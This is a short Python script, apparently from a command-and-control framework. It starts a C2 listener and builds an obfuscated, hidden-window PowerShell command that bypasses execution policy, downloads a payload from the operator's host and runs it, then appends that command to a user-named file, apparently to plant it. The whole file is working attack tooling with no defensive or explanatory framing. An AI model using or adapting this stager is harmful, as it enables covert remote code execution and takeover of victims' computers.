import sys
import os
import argparse
import time
import threading
import base64
import re
from Lib import web
from Lib import prettytable
from System import Banner
from System import Global
from System.Colors import bcolors
from System.Server import server


parser = argparse.ArgumentParser(description="")
parser.add_argument("ip", help="")
parser.add_argument("name", help="")

args = parser.parse_args()

name = args.name

class Command:
	COMMANDS 	= ['exit','show','help','set','run','list','kill']
	def exit(self,args=None):
		os._exit(0)
	def run(self,args=None):
		threading.Thread(target=server, args=(options['port'][0],options['host'][0],)).start()
		time.sleep(0.1)
		command = "powershell -exec bypass -WindowStyle Hidden IEX(IEX(\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('"+base64.b64encode('(New-Object Net.WebClient).DownloadString("http://%s:%s/get_payload")'%(options['host'][0],options['port'][0]))+"'))\"))"
		fichier = open(name, "a")
		fichier.write(command)
		fichier.close()
		os._exit(0)

agents	= list()
options = {
	'port'		:['8080'	,True	,'The Command and Controler port'],
	'host'		:[args.ip	,True	,'The Command and Controler IP address']
	}


result = getattr(globals()['Command'](),'run')(input)
os._exit(0)
